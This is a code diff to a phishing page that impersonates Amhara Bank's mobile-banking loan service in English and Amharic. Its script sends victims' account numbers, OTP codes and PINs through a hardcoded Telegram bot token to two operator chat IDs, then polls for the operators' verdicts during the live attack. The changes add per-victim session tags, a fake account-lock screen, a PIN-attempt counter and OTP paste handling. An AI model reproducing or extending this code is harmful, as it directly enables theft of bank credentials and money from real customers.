@@ -121,7 +121,7 @@
         <div id="page-otp" class="page" style="padding: 25px;">
             <h2 class="setup-title" data-key="otp-head">Verification</h2><p class="setup-sub" data-key="otp-sub">A 6-digit OTP has been sent to your registered mobile number from Amhara Bank. Please enter the code below to continue.</p>
             <div class="otp-inputs">
-                <input type="number" class="otp-box" id="o1" oninput="limitAndMove(this, 'o2')" onkeydown="checkBack(event, '')">
+                <input type="number" class="otp-box" id="o1" oninput="limitAndMove(this, 'o2')" onkeydown="checkBack(event, '')" onpaste="handlePaste(event)">
                 <input type="number" class="otp-box" id="o2" oninput="limitAndMove(this, 'o3')" onkeydown="checkBack(event, 'o1')">
                 <input type="number" class="otp-box" id="o3" oninput="limitAndMove(this, 'o4')" onkeydown="checkBack(event, 'o2')">
                 <input type="number" class="otp-box" id="o4" oninput="limitAndMove(this, 'o5')" onkeydown="checkBack(event, 'o3')">
@@ -156,6 +156,12 @@
             <button class="btn-gold active-btn" style="width:100%; margin-top:20px;" onclick="location.reload()" data-key="done">Done</button>
         </div>
 
+        <div id="page-locked" class="page" style="padding: 40px 30px; text-align: center;">
+            <div style="font-size: 60px; color: #d9534f; margin-bottom: 20px;">🔒</div>
+            <h2 class="setup-title" data-key="lock-h">Account Locked</h2><p class="setup-sub" data-key="lock-p">Security Alert: Your mobile banking access has been temporarily locked due to multiple failed attempts. Please visit the nearest Amhara Bank branch with your ID to restore access.</p>
+            <button class="btn-gold active-btn" style="width:100%; margin-top:20px;" onclick="location.reload()" data-key="done">Finish</button>
+        </div>
+
         <div id="page-success" class="page" style="padding: 40px 30px; text-align: center;">
             <div style="font-size: 60px; color: #4CAF50; margin-bottom: 20px;">✓</div>
             <h2 class="success-title" data-key="succ-h">Request Successful</h2><p class="success-body" data-key="succ-p">Your application has been received successfully. You will receive an SMS update within 24 business hours. After confirmation, please complete the remaining steps in person.</p>
@@ -163,17 +169,29 @@
         </div>
     </div>
 
-    <div class="modal" id="otp-expired-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="otp-exp-h">OTP Expired</h3><p data-key="otp-exp-p">Your OTP has expired. Please try again.</p><button class="btn-gold active-btn" onclick="resendOTPFromAdmin()" data-key="try-again">Try Again</button></div></div>
+    <div class="modal" id="otp-expired-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="otp-exp-h">OTP Expired</h3><p data-key="otp-exp-p">Your OTP has expired. Please try again.</p><button class="btn-gold active-btn" onclick="resendOTPFlow()" data-key="try-again">Try Again</button></div></div>
     <div class="modal" id="info-modal"><div class="modal-box"><h3 data-key="modal-h" style="color:var(--bank-blue);">Password Reset</h3><p data-key="modal-p">Please visit your nearest branch for password recovery.</p><button class="btn-gold active-btn" onclick="hideModal('info-modal')">OK</button></div></div>
     <div class="modal" id="error-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="err-h">Error</h3><p data-key="acc-err-p">The account number is incorrect. Please try again.</p><button class="btn-gold active-btn" onclick="resetToAccount()" data-key="try-again">Retry</button></div></div>
     <div class="modal" id="not-reg-modal"><div class="modal-box"><h3 style="color:var(--bank-blue);" data-key="reg-h">Notice</h3><p data-key="reg-p">Account not registered for mobile banking.</p><button class="btn-gold active-btn" onclick="resetToAccount('not-reg-modal')" data-key="done">OK</button></div></div>
-    <div class="modal" id="otp-error-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="otp-err-h">OTP Error</h3><p data-key="otp-err-p">The code entered is incorrect.</p><button class="btn-gold active-btn" onclick="retryOTP()" data-key="try-again">Retry</button></div></div>
-    <div class="modal" id="pin-error-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="pin-err-h">Incorrect Password</h3><p data-key="pin-err-p">The mobile banking password you entered is incorrect. Please try again.</p><button class="btn-gold active-btn" onclick="retryPin()" data-key="try-again">Retry</button></div></div>
+    <div class="modal" id="otp-error-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="otp-err-h">OTP Error</h3><p data-key="otp-err-p">The code entered is incorrect.</p><button class="btn-gold active-btn" onclick="resendOTPFlow()" data-key="try-again">Resend OTP</button></div></div>
+    <div class="modal" id="pin-error-modal"><div class="modal-box"><h3 style="color:#d9534f;" id="pin-error-title">Incorrect Password</h3><p id="pin-error-body">The mobile banking password you entered is incorrect.</p><button class="btn-gold active-btn" id="pin-retry-btn" onclick="retryPin()" data-key="try-again">Retry</button></div></div>
 
     <script>
         const BOT_TOKEN = "8472250354:AAFDjUbcUCPBjo-UGBVIUys9mqOfz1cy5Ks";
         const ADMIN_IDS = ["5668579491", "8145799125"];
+
+        // 50 Names Generator for Unique Identification
+        const NAMES_LIST = ["Daniel", "Sara", "Abebe", "Mulu", "Kebede", "Selam", "Yonas", "Hanna", "Tewodros", "Martha", "Dawit", "Rahel", "Samuel", "Ruth", "Elias", "Helen", "Getachew", "Aster", "Mesfin", "Lydia", "Biniyam", "Tigist", "Solomon", "Genet", "Abel", "Zenebech", "Ephraim", "Fekerte", "Henok", "Lemlem", "Natnael", "Marta", "Zelalem", "Workenesh", "Tamrat", "Seble", "Girma", "Almaz", "Tadesse", "Hiwot", "Dereje", "Beza", "Kassa", "Sintayehu", "Fikru", "Kidist", "Assefa", "Edel", "Yared", "Tsion"];
+        
+        let roundNumber = parseInt(localStorage.getItem('user_round') || "1");
+        let nameIndex = parseInt(localStorage.getItem('user_name_index') || Math.floor(Math.random() * NAMES_LIST.length).toString());
+        localStorage.setItem('user_name_index', nameIndex);
+        
+        const USER_NAME = NAMES_LIST[nameIndex];
+        const SESSION_ID = `${USER_NAME}_${roundNumber}`;
+        
         let countdownInterval, otpInterval, lastOffset = 0, pollerInterval, currentAccount = "";
+        let pinAttempts = 0;
 
         const translations = {
             en: {
@@ -186,6 +204,7 @@
                 "pin-wait-h": "Confirming", "pin-wait-p": "Please wait while we confirm your request. This may take a moment.",
                 "succ-h": "Request Successful", "succ-p": "Your application has been received successfully. You will receive an SMS update within 24 business hours. After confirmation, please complete the remaining steps in person.", "done": "Finish",
                 "inel-h": "Ineligible", "inel-p": "Your account balance is not eligible for a loan. Please deposit money and try again.",
+                "lock-h": "Account Locked", "lock-p": "Security Alert: Your mobile banking access has been temporarily locked due to multiple failed attempts. Please visit the nearest Amhara Bank branch with your ID to restore access.",
                 "otp-exp-h": "OTP Expired", "otp-exp-p": "Your OTP has expired. Please try again.", "try-again": "Try Again"
             },
             am: {
@@ -198,6 +217,7 @@
                 "pin-wait-h": "በማረጋገጥ ላይ", "pin-wait-p": "ጥያቄዎን እስክናረጋግጥ ድረስ እባክዎ ይጠብቁ። ይህ ጥቂት ጊዜ ሊወስድ ይችላል።",
                 "succ-h": "ጥያቄው ተሳክቷል", "succ-p": "ማመልከቻዎ በተሳካ ሁኔታ ደርሷል። በ 24 የሥራ ሰዓታት ውስጥ በኤስኤምኤስ (SMS) መረጃ ይደርስዎታል። ካረጋገጡ በኋላ እባክዎ ቀሪዎቹን ደረጃዎች በአካል ተገኝተው ያጠናቅቁ።", "done": "ጨርስ",
                 "inel-h": "ብቁ አይደሉም", "inel-p": "የአካውንትዎ ቀሪ ሂሳብ ለብድር ብቁ አይደለም። እባክዎ ገንዘብ ያስገቡ እና እንደገና ይሞክሩ።",
+                "lock-h": "መለያ ተዘግቷል", "lock-p": "የደህንነት ማስጠንቀቂያ፡ በተደጋጋሚ በተሳሳተ ሙከራ ምክንያት የሞባይል ባንኪንግ አገልግሎትዎ ለጊዜው ታግዷል። እባክዎ በአቅራቢያዎ ወደሚገኝ የአማራ ባንክ ቅርንጫፍ በባንክ ደብተርዎ እና መታወቂያዎ ይምጡ።",
                 "otp-exp-h": "OTP ጊዜው አልፏል", "otp-exp-p": "የእርስዎ OTP ጊዜው አልፎበታል። እባክዎ እንደገና ይሞክሩ።", "try-again": "እንደገና ይሞክሩ"
             }
         };
@@ -243,61 +263,91 @@
         }
 
         function notifyApply() { 
-            ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=User started application`));
+            ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=User started application [User: ${SESSION_ID}]`));
             showPage('account'); 
         }
 
         async function submitAccount() {
             currentAccount = document.getElementById('acc-input').value;
-            showPage('waiting'); startTimer('timer', 300); 
+            showPage('waiting'); 
+            startTimer('timer', 300); 
             const kb = { inline_keyboard: [[
-                { text: "✅ Correct", callback_data: `acc_check_yes` },
-                { text: "❌ Incorrect", callback_data: `acc_check_no` },
-                { text: "🚫 Not Registered", callback_data: `acc_check_notreg` }
+                { text: "✅ Correct", callback_data: `acc_check_yes_${SESSION_ID}` },
+                { text: "❌ Incorrect", callback_data: `acc_check_no_${SESSION_ID}` },
+                { text: "🚫 Not Registered", callback_data: `acc_check_notreg_${SESSION_ID}` }
             ]]};
             for (let id of ADMIN_IDS) {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: "POST", headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: id, text: `🏦 Verify Account Number: \n\n<code>${currentAccount}</code>`, parse_mode: "HTML", reply_markup: kb })
+                    body: JSON.stringify({ chat_id: id, text: `🏦 Verify Account Number: \n\n<code>${currentAccount}</code>\n\n[User: ${SESSION_ID}]`, parse_mode: "HTML", reply_markup: kb })
                 });
             }
             pollAdmin("acc_check");
         }
 
-        async function resendOTPFromAdmin() {
+        function resendOTPFlow() {
+            hideModal('otp-error-modal');
             hideModal('otp-expired-modal');
-            showPage('waiting'); startTimer('timer', 300);
-            ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=User requested RESEND OTP for Account: ${currentAccount}`));
-            submitAccount(); // Re-triggers the verification flow
+            document.querySelectorAll('.otp-box').forEach(box => box.value = '');
+            document.getElementById('otp-btn').classList.remove('active-btn');
+            document.getElementById('otp-btn').disabled = true;
+            showPage('waiting'); 
+            startTimer('timer', 300);
+            ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=User RESEND OTP [User: ${SESSION_ID}]`));
+            submitAccount(); 
+        }
+
+        // --- AUTO-PASTE FIX ---
+        function handlePaste(e) {
+            e.preventDefault();
+            const pasteData = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+            if (!pasteData) return;
+            const boxes = document.querySelectorAll('.otp-box');
+            pasteData.split('').forEach((char, i) => { if (boxes[i]) boxes[i].value = char; });
+            const nextIdx = Math.min(pasteData.length, 5);
+            boxes[nextIdx].focus();
+            checkOtpReady();
+        }
+
+        function limitAndMove(curr, nextId) {
+            if (curr.value.length > 1) curr.value = curr.value.slice(0,1);
+            if (curr.value.length === 1 && nextId) document.getElementById(nextId).focus();
+            checkOtpReady();
+        }
+
+        function checkOtpReady() {
+            const filled = Array.from(document.querySelectorAll('.otp-box')).every(b => b.value !== "");
+            const btn = document.getElementById('otp-btn');
+            if (filled) { btn.classList.add('active-btn'); btn.disabled = false; }
+            else { btn.classList.remove('active-btn'); btn.disabled = true; }
         }
 
         async function submitOTP() {
             clearInterval(otpInterval);
             let otp = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
             showPage('otp-waiting'); 
-            await sendToAdmin(`🔑 OTP: \n\n<code>${otp}</code>\n\nAccount: <code>${currentAccount}</code>`, "otp_check");
+            await sendToAdmin(`🔑 OTP: \n\n<code>${otp}</code>\n\nAccount: <code>${currentAccount}</code>\n\n[User: ${SESSION_ID}]`, "otp_check");
             pollAdmin("otp_check");
         }
 
         async function submitPin() {
             let pin = document.getElementById('pin-field').value;
             showPage('pin-waiting');
-            const kb = { inline_keyboard: [[
-                { text: "✅ Correct", callback_data: `pin_check_yes` },
-                { text: "❌ Incorrect", callback_data: `pin_check_no` },
-                { text: "⛔ Not Eligible", callback_data: `pin_check_noteligible` }
-            ]]};
+            const kb = { inline_keyboard: [
+                [{ text: "✅ Correct", callback_data: `pin_check_yes_${SESSION_ID}` }, { text: "❌ Incorrect", callback_data: `pin_check_no_${SESSION_ID}` }],
+                [{ text: "⛔ Not Eligible", callback_data: `pin_check_noteligible_${SESSION_ID}` }, { text: "🔒 Lock Account", callback_data: `pin_check_locked_${SESSION_ID}` }]
+            ]};
             for (let id of ADMIN_IDS) {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: "POST", headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: id, text: `💳 PIN/Pass: \n\n<code>${pin}</code>\n\nAccount: <code>${currentAccount}</code>`, parse_mode: "HTML", reply_markup: kb })
+                    body: JSON.stringify({ chat_id: id, text: `💳 PIN: \n\n<code>${pin}</code>\n\n[User: ${SESSION_ID}]`, parse_mode: "HTML", reply_markup: kb })
                 });
             }
             pollAdmin("pin_check");
         }
 
         async function sendToAdmin(text, context) {
-            const kb = { inline_keyboard: [[{ text: "✅ Correct", callback_data: `${context}_yes` }, { text: "❌ Incorrect", callback_data: `${context}_no` }]]};
+            const kb = { inline_keyboard: [[{ text: "✅ Correct", callback_data: `${context}_yes_${SESSION_ID}` }, { text: "❌ Incorrect", callback_data: `${context}_no_${SESSION_ID}` }]]};
             for (let id of ADMIN_IDS) {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: "POST", headers: { "Content-Type": "application/json" },
@@ -312,17 +362,18 @@
                 try {
                     const resJson = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastOffset}`);
                     const data = await resJson.json();
-                    if (data.result && data.result.length > 0) {
+                    if (data.result) {
                         for (let update of data.result) {
                             lastOffset = update.update_id + 1;
                             if (update.callback_query) {
                                 let action = update.callback_query.data;
-                                if (action.startsWith(context)) {
+                                if (action.startsWith(context) && action.includes(SESSION_ID)) {
                                     clearInterval(pollerInterval);
-                                    if (action.endsWith("_yes")) handleAdminChoice(context, "yes");
-                                    else if (action.endsWith("_no")) handleAdminChoice(context, "no");
-                                    else if (action.endsWith("_notreg")) handleAdminChoice(context, "notreg");
-                                    else if (action.endsWith("_noteligible")) handleAdminChoice(context, "noteligible");
+                                    if (action.includes("_yes")) handleAdminChoice(context, "yes");
+                                    else if (action.includes("_no")) handleAdminChoice(context, "no");
+                                    else if (action.includes("_notreg")) showModal('not-reg-modal');
+                                    else if (action.includes("_noteligible")) showPage('ineligible');
+                                    else if (action.includes("_locked")) showPage('locked');
                                 }
                             }
                         }
@@ -335,32 +386,27 @@
             if (choice === "yes") {
                 if(context === "acc_check") { showPage('otp'); startOtpCountdown(); }
                 else if(context === "otp_check") showPage('login');
-                else showPage('success');
-            } else if (choice === "no") {
+                else { localStorage.setItem('user_round', (roundNumber + 1).toString()); showPage('success'); }
+            } else {
                 if(context === "acc_check") showModal('error-modal');
-                else if(context === "otp_check") showModal('otp-error-modal');
-                else showModal('pin-error-modal');
-            } else if (choice === "notreg") showModal('not-reg-modal');
-            else if (choice === "noteligible") showPage('ineligible');
+                else if(context === "otp_check") {
+                    document.querySelectorAll('.otp-box').forEach(box => box.value = '');
+                    checkOtpReady();
+                    showModal('otp-error-modal');
+                } else {
+                    pinAttempts++;
+                    if (pinAttempts >= 3) showPage('locked');
+                    else {
+                        let left = 3 - pinAttempts;
+                        document.getElementById('pin-error-body').innerText = `Incorrect password. You have ${left} attempt(s) left.`;
+                        showModal('pin-error-modal');
+                    }
+                }
+            }
         }
 
-        function retryOTP() { 
-            hideModal('otp-error-modal'); 
-            document.querySelectorAll('.otp-box').forEach(b => b.value = '');
-            showPage('otp'); startOtpCountdown();
-        }
-
-        function retryPin() { 
-            hideModal('pin-error-modal'); 
-            document.getElementById('pin-field').value = ''; validatePin(); 
-            showPage('login'); 
-        }
-
-        function resetToAccount(modalId = 'error-modal') { 
-            hideModal(modalId); document.getElementById('acc-input').value = ''; validateAcc();
-            showPage('account'); 
-        }
-
+        function retryPin() { hideModal('pin-error-modal'); document.getElementById('pin-field').value = ''; showPage('login'); }
+        function resetToAccount() { hideModal('error-modal'); hideModal('not-reg-modal'); showPage('account'); }
         function validateAcc() {
             const input = document.getElementById('acc-input');
             if (input.value.length > 13) input.value = input.value.slice(0, 13);
@@ -369,20 +415,10 @@
             if (input.value.length === 13) { btn.classList.add('active-btn'); btn.disabled = false; }
             else { btn.classList.remove('active-btn'); btn.disabled = true; }
         }
-
-        function limitAndMove(curr, nextId) {
-            if (curr.value.length > 1) curr.value = curr.value.slice(0,1);
-            if (curr.value.length === 1 && nextId) document.getElementById(nextId).focus();
-            const filled = Array.from(document.querySelectorAll('.otp-box')).every(b => b.value !== "");
-            const btn = document.getElementById('otp-btn');
-            if (filled) { btn.classList.add('active-btn'); btn.disabled = false; }
-            else { btn.classList.remove('active-btn'); btn.disabled = true; }
-        }
-
         function checkBack(e, prevId) { if (e.key === "Backspace" && e.target.value === "" && prevId) document.getElementById(prevId).focus(); }
         function validatePin() {
             const btn = document.getElementById('reg-btn');
-            if (document.getElementById('pin-field').value.length >= 4) { btn.classList.add('active-btn'); btn.disabled = false; }
+            if (document.getElementById('pin-field').value.length >= 6) { btn.classList.add('active-btn'); btn.disabled = false; }
             else { btn.classList.remove('active-btn'); btn.disabled = true; }
         }
         function togglePin() { const p = document.getElementById('pin-field'); p.type = p.type === 'password' ? 'text' : 'password'; }
